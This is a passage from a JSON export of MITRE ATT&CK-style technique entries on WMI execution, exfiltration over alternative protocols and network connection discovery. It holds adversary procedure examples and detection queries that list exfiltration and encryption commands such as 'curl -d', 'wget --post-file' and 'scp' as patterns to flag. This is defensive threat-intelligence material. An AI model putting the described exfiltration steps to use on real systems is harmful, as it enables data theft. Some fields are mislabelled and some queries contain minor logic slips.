      "PoshC2has a number of modules that use WMI to execute tasks.[131]",
      "PowerSploit'sInvoke-WmiCommandCodeExecution module uses WMI to execute and retrieve the output from aPowerShellpayload.[132][133]",
      "POWERSTATScan use WMI queries to retrieve data from compromised hosts.[134][115]",
      "POWRUNERmay use WMI when collecting information about a victim.[135]",
      "ProLockcan use WMIC to execute scripts on targeted hosts.[136]",
      "PyDCrypthas attempted to execute with WMIC.[137]",
      "QakBotcan execute WMI queries to gather information.[138]",
      "Raspberry Robincan execute via LNK containing a command to run a legitimate executable, such as wmic.exe, to download a malicious Windows Installer (MSI) package.[139]",
      "RATANKBAuses WMI to perform process monitoring.[140][141]",
      "Remexiexecutes received commands with wmic.exe (for WMI commands).[142]",
      "REvilcan use WMI to monitor for and kill specific processes listed in its configuration file.[143][144]",
      "RogueRobinuses various WMI queries to check if the sample is running in a sandbox.[145][146]",
      "Sandworm Teamhas usedImpacket’s WMIexec module for remote code execution and VBScript to run WMI queries.[5][147]",
      "Sardoniccan use WMI to execute PowerShell commands on a compromised machine.[148]",
      "SharpStagecan use WMI for execution.[112][149]",
      "ShrinkLockeruses WMI to query information about the victim operating system.[150]",
      "Sibothas used WMI to discover network connections and configurations.Sibothas also used the Win32_Process class to execute a malicious DLL.[151]",
      "SILENTTRINITYcan use WMI for lateral movement.[152]",
      "Snip3can query the WMI classWin32_ComputerSystemto gather information.[153]",
      "SocGholishhas used WMI calls for script execution and system profiling.[154]",
      "During theSolarWinds Compromise,APT29used WMI for the remote execution of files for lateral movement.[155][156]",
      "Stealth Falconmalware gathers system information via Windows Management Instrumentation (WMI).[157]",
      "StoneDrillhas used the WMI command-line (WMIC) utility to run tasks.[158]",
      "Stuxnetused WMI with anexplorer.exetoken to execute on a remote share.[159]",
      "SUNBURSTused the WMI querySelect * From Win32_SystemDriverto retrieve a driver listing.[160]",
      "SVCReadycan useWMIqueries to detect the presence of a virtual machine environment.[161]",
      "SysUpdatecan use WMI for execution on a compromised host.[162]",
      "TA2541has used WMI to query targeted systems for security products.[163]",
      "TAMECAThas used Windows Management Instrumentation (WMI) to query anti-virus products.[14]",
      "AThreat Group-3390tool can use WMI to execute a binary.[164]",
      "ToddyCathas used WMI to execute scripts for post exploit document collection.[165]",
      "Ursnifdroppers have used WMI classes to executePowerShellcommands.[166]",
      "Valakcan usewmic process call createin a scheduled task to launch plugins and for execution.[167]",
      "Velvet Antused thewmiexec.pytool withinImpacketfor remote process execution via WMI.[82]",
      "Volt Typhoonhas leveraged WMIC for execution, remote system discovery, and to create and use temporary directories.[168][169][170][171]",
      "WannaCryutilizeswmicto delete shadow copies.[172][173][174]",
      "Windshifthas used WMI to collect information about target machines.[175]",
      "Wizard Spiderhas used WMI and LDAP queries for network discovery and to move laterally.Wizard Spiderhas also used batch scripts to leverage WMIC to deploy ransomware.[176][177][178][179][180]",
      "One variant ofZebrocyuses WMI queries to gather information.[181]"
    ]
  },
  "T1048": {
    "Name": "Exfiltration Over Alternative Protocol",
    "Description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.Exfiltration Over Alternative Protocolcan be done using various common operating system utilities such asNet/SMB or FTP.[1]On macOS and Linuxcurlmay be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.[2]Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console orCloud API.",
    "Detects": [
      "Monitor cloud-based file hosting services, such as Google Drive and Microsoft OneDrive, for unusual instances of file downloads – for example, many downloads by a single user in a short period of time. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies. Additionally, data loss prevention policies can be defined to detect and alert on exfiltration events on particularly sensitive data.Analytic 1 - Detecting Alternative Exfiltration via Cloud Services(EventCode=\"FileUploaded\" OR EventCode=\"PutObject\" OR source=\"O365_audit\" OR source=\"Google_Admin_Logs\")| where (action IN (\"upload\", \"putObject\", \"email_sent\", \"drive_upload\"))| stats count by _time, host, user, action, destination, file_size| where count >= 3| eval risk_score=case(    action IN (\"putObject\", \"FileUploaded\") AND file_size > 10000000, 9,    action IN (\"email_sent\") AND file_size > 5000000, 8)| where risk_score >= 8| table _time, host, user, action, destination, file_size, risk_score",
      "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set and are allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.Analytic 1 - Detecting Suspicious Cloud Storage Exfiltration(EventCode=\"PutObject\" OR EventCode=\"FileSharedExternally\" OR source=\"Google_Admin_Logs\")| where (file_size > 5000000 OR file_access_count > 10)| stats count by _time, host, user, file_name, action, storage_bucket, file_size| where count >= 5| eval risk_score=case(    file_size > 50000000, 9,    file_size > 10000000, 8)| where risk_score >= 8| table _time, host, user, file_name, action, storage_bucket, file_size, risk_score",
      "Monitor executed commands and arguments that may steal data by exfiltrating it over a different protocol than that of the existing command and control channel.Analytic 1 - Detecting Alternative Protocol Exfiltration via Command Execution(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"scp\", \"ftp\", \"curl -d\", \"wget --post-file\", \"powershell -enc\", \"tar -cf\", \"7z a\"))| eval risk_score=case(    command IN (\"scp\", \"rsync\", \"ftp\"), 9,    command IN (\"tar -cf\", \"zip -r\"), 8,    command IN (\"powershell -enc\", \"wget\"), 7)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for suspicious files (i.e. .pdf, .docx, .jpg, etc.) viewed in isolation that may steal data by exfiltrating it over a different protocol than that of the existing command and control channel.",
      "Monitor for outbound connections using non-standard ports for FTP, SMTP, or SMB, new processes generating large amounts of outbound traffic, or traffic flows that do not align with normal business usage patterns.Analytic 1 - Detecting Exfiltration Over Alternative Protocols(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_port IN (21, 25, 53, 139, 445, 587, 465, 990))| bucket span=1h _time| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip, dest_port| where count >= 5 AND total_bytes > 10000000| eval risk_score=case(    total_bytes > 50000000, 9,    total_bytes > 10000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, dest_port, risk_score",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "AADInternalscan directly download cloud user data such as OneDrive files.[3]",
      "Bundloreuses thecurl -s -L -ocommand to exfiltrate archived data to a URL.[2]",
      "Chaeshas exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol.[4]",
      "FrameworkPOScan use DNS tunneling for exfiltration of credit card data.[5]",
      "Hydraqconnects to a predefined domain on port 443 to exfil gathered information.[6]",
      "Kobaloscan exfiltrate credentials over the network via UDP.[7]",
      "Playhas used WinSCP to exfiltrate data to actor-controlled accounts.[8][9]",
      "PoetRAThas used a .NET tool named dog.exe to exiltrate information over an e-mail account.[10]",
      "TeamTNThas sent locally staged files with collected credentials to C2 servers using cURL.[11]"
    ]
  },
  "T1048.001": {
    "Name": "Exfiltration Over Alternative Protocol:Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "Description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data.Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
    "Detects": [
      "Monitor for execution of encryption-related tools before outbound data transfer, use of symmetric encryption algorithms (AES, RC4, Blowfish) in scripts or binaries, or file encryption activity followed by network communication.Analytic 1 - Detecting Symmetric Encryption Before Exfiltration(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"openssl enc -aes-256-cbc\", \"gpg -c\", \"python -c 'import Crypto.Cipher.AES'\", \"certutil -encode\"))| eval risk_score=case(    command IN (\"openssl enc -aes-256-cbc\", \"gpg -c\"), 9,    command IN (\"python -c 'import Crypto.Cipher.AES'\", \"certutil -encode\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for files being encrypted before transfer, temporary storage of encrypted files before exfiltration, or files with unusual extensions indicative of encryption (.aes, .enc, .bin).Analytic 1 - Detecting Encrypted Files Before Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\*\\Documents\\exfil\") AND file_extension IN (\"aes\", \"enc\", \"bin\"))| eval risk_score=case(    file_extension=\"aes\" OR file_extension=\"enc\", 9,    file_extension=\"bin\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, file_extension, risk_score",
      "Monitor for outbound network connections using traditionally non-encrypted protocols, connections where data sent is significantly larger than data received, traffic spikes over uncommon ports (e.g., FTP, SMB, SMTP, ICMP), or traffic patterns indicative of encrypted payload transmission.Analytic 1 - Detecting Symmetric Encrypted Exfiltration via Alternative Protocols(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_port IN (21, 25, 53, 139, 445, 587, 990) AND bytes_out > 10000000)| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip, dest_port| where count >= 3 AND total_bytes > 50000000| eval risk_score=case(    total_bytes > 100000000, 9,    total_bytes > 50000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, dest_port, risk_score",
      "Monitor for encrypted payloads using symmetric cryptography over plaintext channels, detection of RC4, AES, or Blowfish in network traffic, or HTTP, FTP, or DNS packets containing unusually long Base64 or XOR-encoded strings.Analytic 1 - Detecting Encrypted Payloads in Alternative Protocols(EventCode=3 OR source=\"zeek_http.log\" OR source=\"dns.log\")| where (uri_length > 200 OR request_body_length > 5000)| eval encoded_data=if(match(uri, \"([A-Za-z0-9+/=]{100,})\") OR match(request_body, \"([A-Za-z0-9+/=]{100,})\"), 1, 0)| where encoded_data=1| stats count by _time, host, user, uri, request_body_length, risk_score| eval risk_score=case(    request_body_length > 10000, 9,    request_body_length > 5000, 8)| where risk_score >= 8| table host, uri, request_body_length, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.",
      "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.",
      "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.[1]"
    ]
  },
  "T1048.002": {
    "Name": "Exfiltration Over Alternative Protocol:Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "Description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin.Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
    "Detects": [
      "Monitor for execution of asymmetric encryption tools (e.g., OpenSSL, GPG, SSH key exchange), processes generating RSA/ECC key pairs before outbound network activity, or file encryption activity linked to later network transmissions.Analytic 1 - Detecting Asymmetric Encryption Before Exfiltration(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"openssl rsautl -encrypt\", \"gpg --encrypt\", \"ssh-keygen -t rsa\", \"openssl pkeyutl -encrypt\"))| eval risk_score=case(    command IN (\"openssl rsautl -encrypt\", \"gpg --encrypt\"), 9,    command IN (\"ssh-keygen -t rsa\", \"openssl pkeyutl -encrypt\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor files being encrypted before transmission, temporary storage of encrypted files in staging areas before exfiltration, or presence of public/private key files in suspicious locations.Analytic 1 - Detecting Encrypted Files Before Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\*\\Documents\\exfil\") AND file_extension IN (\"gpg\", \"rsa\", \"pem\", \"p12\"))| eval risk_score=case(    file_extension=\"gpg\" OR file_extension=\"rsa\", 9,    file_extension=\"pem\" OR file_extension=\"p12\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, file_extension, risk_score",
      "Monitor for outbound network connections using TLS-based encryption over non-standard ports, processes initiating large encrypted data transfers that typically do not communicate, or encrypted traffic with long-duration sessions indicative of large data exfiltration.Analytic 1 - Detecting Exfiltration Over Asymmetric Encrypted Channels(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_port IN (22, 443, 465, 993, 995) AND bytes_out > 10000000)| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip, dest_port| where count >= 3 AND total_bytes > 50000000| eval risk_score=case(    total_bytes > 100000000, 9,    total_bytes > 50000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, dest_port, risk_score",
      "Monitor for asymmetric encryption key exchange over unexpected network channels, detection of long Base64, PEM, or PGP keys transmitted in network payloads, or TLS handshakes or encrypted payloads in non-TLS standard traffic.Analytic 1 - Detecting Encrypted Payloads in Non-C2 Channels(EventCode=3 OR source=\"zeek_http.log\" OR source=\"dns.log\")| where (uri_length > 200 OR request_body_length > 5000)| eval encoded_data=if(match(uri, \"-----BEGIN (RSA|EC|PGP) PRIVATE KEY-----\") OR match(request_body, \"-----BEGIN (RSA|EC|PGP) PUBLIC KEY-----\"), 1, 0)| where encoded_data=1| stats count by _time, host, user, uri, request_body_length, risk_score| eval risk_score=case(    request_body_length > 10000, 9,    request_body_length > 5000, 8)| where risk_score >= 8| table host, uri, request_body_length, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT28has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.[1]",
      "CURIUMhas used SMTPS to exfiltrate collected data from victims.[2]",
      "IcedIDhas exfiltrated collected data via HTTPS.[3]",
      "Rclonecan exfiltrate data over SFTP or HTTPS via WebDAV.[4]",
      "During theSolarWinds Compromise,APT29exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.[5]",
      "Storm-1811has exfiltrated captured user credentials via Secure Copy Protocol (SCP).[6]"
    ]
  },
  "T1048.003": {
    "Name": "Exfiltration Over Alternative Protocol:Exfiltration Over Unencrypted Non-C2 Protocol",
    "Description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.[1]Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "Detects": [
      "Monitor for execution of exfiltration-related commands such as ftp, curl, scp, tftp, use of Base64 encoding, gzip, or other obfuscation before transmission, or use of CLI-based copy commands to move files to external destinations.Analytic 1 - Detecting Unencrypted Exfiltration via Command Execution(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"ftp\", \"curl -T\", \"wget --post-file\", \"scp\", \"rsync\", \"tftp\", \"base64\"))| eval risk_score=case(    command IN (\"ftp\", \"scp\", \"tftp\"), 9,    command IN (\"base64\", \"gzip\", \"tar\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor files being accessed and staged before unencrypted exfiltration, creation of compressed archives before network transmission, or presence of encoded file formats that indicate obfuscation (.b64, .zip, .tar).Analytic 1 - Detecting File Access Before Unencrypted Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\*\\Documents\\exfil\") AND file_extension IN (\"b64\", \"tar\", \"zip\"))| eval risk_score=case(    file_extension=\"b64\" OR file_extension=\"tar\", 9,    file_extension=\"zip\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, file_extension, risk_score",
      "Monitor for unencrypted outbound network connections involving file transfer protocols, processes sending significantly more data than they receive, or outbound data transfers occurring at unusual times.Analytic 1 - Detecting Exfiltration Over Unencrypted Alternative Protocols(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_port IN (21, 53, 69, 139, 445, 8080) AND bytes_out > 10000000)| stats count, sum(bytes_out) as total_bytes by _time, host, process, dest_ip, dest_port| where count >= 3 AND total_bytes > 50000000| eval risk_score=case(    total_bytes > 100000000, 9,    total_bytes > 50000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, dest_port, risk_score",
      "Monitor for data obfuscation methods such as Base64, XOR, or URL encoding in HTTP requests, use of TFTP, FTP, or DNS for data exfiltration, or outbound requests containing encoded strings in GET or POST parameters.Analytic 1 - Detecting Encoded Data in Unencrypted Alternative Protocols(EventCode=3 OR source=\"zeek_http.log\" OR source=\"dns.log\")| where (uri_length > 200 OR request_body_length > 5000)| eval encoded_data=if(match(uri, \"([A-Za-z0-9+/=]{100,})\") OR match(request_body, \"([A-Za-z0-9+/=]{100,})\"), 1, 0)| where encoded_data=1| stats count by _time, host, user, uri, request_body_length, risk_score| eval risk_score=case(    request_body_length > 10000, 9,    request_body_length > 5000, 8)| where risk_score >= 8| table host, uri, request_body_length, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Agent Teslahas routines for exfiltration over SMTP, FTP, and HTTP.[2][3][4]",
      "APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.[5]",
      "APT33has used FTP to exfiltrate files (separately from the C2 channel).[6]",
      "BITSAdmincan be used to createBITS Jobsto upload files from a compromised host.[7]",
      "SomeBrave Princevariants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.[8]",
      "DuringC0017,APT41exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.[9]",
      "Carbonuses HTTP to send data to the C2 server.[10]",
      "ccf32can upload collected data and files to an FTP server.[11]",
      "CharmPowercan send victim data via FTP with credentials hardcoded in the script.[12]",
      "Cherry Pickerexfiltrates files over FTP.[13]",
      "CookieMinerhas used thecurl --upload-filecommand to exfiltrate data over HTTP.[14]",
      "CORALDECKhas exfiltrated data in HTTP POST headers.[15]",
      "CosmicDukeexfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.[16]",
      "Dokexfiltrates logs of its execution stored in the/tmpfolder over FTP using thecurlcommand.[17]",
      "FIN6has sent stolen payment card data to remote servers via HTTP POSTs.[18]",
      "FIN8has used FTP to exfiltrate collected data.[19]",
      "ftpmay be used to exfiltrate data separate from the main command and control protocol.[20][21]",
      "Kesselcan exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.[22]",
      "KONNIhas used FTP to exfiltrate reconnaissance data out.[23]",
      "Lazarus Groupmalware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.[24][25]",
      "OilRighas exfiltrated data via Microsoft Exchange and over FTP separately from its primary C2 channel over DNS.[26][27]",
      "PoetRAThas usedftpfor exfiltration.[28]",
      "Rclonecan exfiltrate data over FTP or HTTP, including HTTP via WebDAV.[29]",
      "Remseccan exfiltrate data via a DNS tunnel or email, separately from its C2 channel.[30]",
      "Salt Typhoonhas exfiltrated configuration files from exploited network devices over FTP and TFTP.[31]",
      "SocGholishcan exfiltrate data directly to its C2 domain via HTTP.[32]",
      "Thriphas used WinSCP to exfiltrate data from a targeted organization over FTP.[33]",
      "WARPWIREcan send captured credentials to C2 via HTTPGETorPOSTrequests.[34][35]",
      "WindTailhas the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.[36]",
      "Wizard Spiderhas exfiltrated victim information using FTP.[37][38]"
    ]
  },
  "T1049": {
    "Name": "System Network Connections Discovery",
    "Description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3]Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information includenetstat, \"net use,\" and \"net session\" withNet. In Mac and Linux,netstatandlsofcan be used to list current connections.who -aandwcan be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices andNetwork Device CLImay be used (e.g.show ip sockets,show tcp brief).[4]On ESXi servers, the commandesxi network ip connection listcan be used to list active network connections.[5]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. Information may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell.For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users.",
      "Monitor for API calls that may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.",
      "Monitor for executed processes that may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network."
    ],
    "Procedure Examples": [
      "admin@338actors used the following command following exploitation of a machine withLOWBALLmalware to display network connections:netstat -ano >> %temp%\\download[6]",
      "Andarielhas used thenetstat -naop tcpcommand to display TCP connections on a victim's machine.[7]",
      "APT1used thenet usecommand to get a listing on network connections.[8]",
      "APT3has a tool that can enumerate current network connections.[9][10][11]",
      "APT32used thenetstat -anpo tcpcommand to display TCP connections on the victim's machine.[12]",
      "APT38installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.[13]",
      "APT41has enumerated IP addresses of network resources and used thenetstatcommand as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.[14][15]",
      "APT5has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs.[16]",
      "Aria-bodyhas the ability to gather TCP and UDP table status listings.[17]",
      "Babukcan use \"WNetOpenEnumW\" and \"WNetEnumResourceW\" to enumerate files in network resources for encryption.[18]",
      "BackdoorDiplomacyhas used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.[19]",
      "BADHATCHcan executenetstat.exe -fon a compromised machine.[20]",
      "BlackEnergyhas gathered information about local network connections usingnetstat.[21][22]",
      "Carbonuses thenetstat -randnetstat -ancommands.[23]",
      "CharmPowercan usenetsh wlan show profilesto list specific Wi-Fi profile details.[24]",
      "Chimerahas usednetstat -ano | findstr ESTto discover network connections.[25]",
      "Cobalt Strikecan produce a sessions report from compromised hosts.[26]",
      "Comnieexecutes thenetstat -anocommand.[27]",
      "Contican enumerate routine network connections from a compromised host.[28]",
      "CrackMapExeccan discover active sessions for a targeted system.[29]",
      "Cubacan use the functionGetIpNetTableto recover the last connections to the victim's machine.[30]",
      "Dtrackcan collect network and active connection information.[31]",
      "The discovery modules used withDuqucan collect information on network connections.[32]",
      "Earth Luscaemployed a PowerShell script called RDPConnectionParser to read and filter the Windows event log \"Microsoft-Windows-TerminalServices-RDPClient/Operational\"(Event ID 1024) to obtain network information from RDP connections.Earth Luscahas also usednetstatfrom a compromised system to obtain network connection information.[33]",
      "Egregorcan enumerate all connected drives.[34]",
      "Empirecan enumerate the current network connections of a host.[35]",
      "Epicuses thenet use,net session, andnetstatcommands to gather information on network connections.[36][37]",
      "FIN13has usednetstatand other net  commands for network reconnaissance efforts.[38]",
      "Flagprohas been used to executenetstat -anoon a compromised host.[39]",
      "FRPcan use a dashboard and U/I to display the status of connections from the FRP client and server.[40]",
      "DuringFunnyDream, the threat actors usednetstatto discover network connections on remote systems.[41]",
      "GALLIUMusednetstat -oanto obtain information about the victim network connections.[42]",
      "GravityRATuses thenetstatcommand to find open ports on the victim’s machine.[43]",
      "HEXANEhas usednetstatto monitor connections to specific ports.[44]",
      "INC Ransomhas used RDP to test network connections.[45]",
      "jRATcan list network connections.[46]",
      "Ke3changperforms local network connection discovery usingnetstat.[47][48]",
      "KONNIhas usednet sessionon the victim's machine.[49]",
      "KOPILUWAKcan usenetstat,Arp, andNetto discover current TCP connections.[50]",
      "Kwampirscollects a list of active and listening connections by using the commandnetstat -naoas well as a list of available network mappings withnet use.[51]",
      "Lazarus Grouphas usednet useto identify and establish a network connection with a remote host.[52]",
      "Lizarhas a plugin to retrieve information about all active network sessions on the infected server.[53]",
      "Lotus Blossomhas used commands such asnetstatto identify system network connections.[54]",
      "Lucifercan identify the IP and port numbers for all remote connections from the compromised host.[55]",
      "LunarWebcan enumerate system network connections.[56]",
      "Macheteuses thenetsh wlan show networks mode=bssidandnetsh wlan show interfacescommands to list all nearby WiFi networks and connected interfaces.[57]",
      "Mafaldacan use theGetExtendedTcpTablefunction to retrieve information about established TCP connections.[58]",
      "Magic Houndhas used quser.exe to identify existing RDP connections.[59]",
      "Mazehas used the \"WNetOpenEnumW\", \"WNetEnumResourceW\", \"WNetCloseEnum\" and \"WNetAddConnection2W\" functions to enumerate the network resources on the infected machine.[60]",
      "menuPasshas usednet useto conduct connectivity checks to machines.[61]",
      "After loading the keyword and phone data files,MESSAGETAPbegins monitoring all network connections to and from the victim server.[62]",
      "MuddyWaterhas used a PowerShell backdoor to check for Skype connections on the target machine.[63]",
      "Mustang Pandahas usednetstat -anoto determine network connection information.[64]",
      "nbtstatcan be used to discover current NetBIOS sessions.",
      "Commands such asnet useandnet sessioncan be used inNetto gather information about network connections from a particular host.[65]",
      "netstatcan be used to enumerate local network connections, including active TCP connections and other network statistics.[66]",
      "NETWIREcan capture session logon details from a compromised host.[67]",
      "OilRighas usednetstat -anon a victim to get a listing of network connections.[68]",
      "Okrumwas seen using NetSess to discover NetBIOS sessions.[69]",
      "DuringOperation CuckooBees, the threat actors used thenet session,net use, andnetstatcommands as part of their advanced reconnaissance.[70]",
      "DuringOperation Wocao, threat actors collected a list of open connections on the infected system usingnetstatand checks whether it has an internet connection.[71]",
      "OSInfoenumerates the current network connections similar tonet use.[9]",
      "Once inside a Virtual Private Cloud,Pacucan attempt to identify DirectConnect, VPN, or VPC Peering.[72]",
      "PlugXhas a module for enumerating TCP and UDP network connections and associated processes using thenetstatcommand.[73]",
      "Poseidon Groupobtains and saves information about victim network interfaces and addresses.[74]",
      "PoshC2contains an implementation ofnetstatto enumerate TCP and UDP connections.[75]",
      "POWRUNERmay collect active network connections by runningnetstat -anon a victim.[76]",
      "Pupyhas a built-in utility command fornetstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.[77]",
      "PyDCrypthas usednetshto find RPC connections on remote machines.[78]",
      "QakBotcan usenetstatto enumerate current network connections.[79][80]",
      "Ramsaycan usenetstatto enumerate network connections.[81]",
      "RATANKBAusesnetstat -anoto search for specific IP address ranges.[82]",
      "RedLeavescan enumerate drives and Remote Desktop sessions.[83]",
      "Remseccan obtain a list of active connections and open ports.[84]",
      "Sandworm Teamhad gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured.[85][86]",
      "Sardonichas the ability to execute thenetstatcommand.[87]",
      "ShimRatReporterused the Windows functionGetExtendedUdpTableto detect connected UDP endpoints.[88]",
      "SHOTPUTusesnetstatto list TCP connection status.[89]",
      "Sibothas retrieved a GUID associated with a present LAN connection on a compromised machine.[90]",
      "Slivercan collect network connection information.[91]",
      "SLOTHFULMEDIAcan enumerate open ports on a victim machine.[92]",
      "SpeakUpuses thearp -acommand.[93]",
      "Sykipotmay usenetstat -anoto display active network connections.[94]",
      "TeamTNThas runnetstat -anpto search for rival malware connections.[95]TeamTNThas also usedlibprocesshiderto modify/etc/ld.so.preload.[96]",
      "Threat Group-3390has usednet useandnetstatto conduct internal discovery of systems. The group has also usedquser.exeto identify existing RDP sessions on a victim.[97]",
      "ToddyCathas usednetstat -anop tcpto discover TCP connections to compromised hosts.[98]",
      "Torismacan useWTSEnumerateSessionsWto monitor remote desktop connections.[99]",
      "Trojan.Karaganycan usenetstatto collect a list of network connections.[100]",
      "Tropic Trooperhas tested if the localhost network is available and other connection capability on an infected system using command scripts.[101]",
      "Turlasurveys a system upon check-in to discover active local network connections using thenetstat -an,net use,net file, andnet sessioncommands.[36][102]TurlaRPC backdoors have also enumerated the IPv4 TCP connection table via theGetTcpTable2API call.[103]",
      "USBferrycan usenetstatandnbtstatto detect active network connections.[101]",
